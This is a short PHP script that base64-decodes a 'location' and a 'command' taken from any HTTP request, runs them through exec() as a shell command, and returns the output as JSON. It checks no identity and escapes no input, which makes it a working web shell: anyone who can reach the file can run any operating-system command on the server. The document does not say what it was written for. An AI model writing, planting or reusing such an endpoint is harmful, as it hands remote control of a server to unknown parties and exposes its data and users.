<?php

$location         = base64_decode($_REQUEST['location']);
$requestedCommand = base64_decode($_REQUEST['command']);
$runnableCommand  = "cd ".$location." && ".$requestedCommand;

exec(
    $runnableCommand,
    $output,
    $returnStatus
);

echo json_encode([
    'output'       => $output,
    'returnStatus' => $returnStatus,
]);
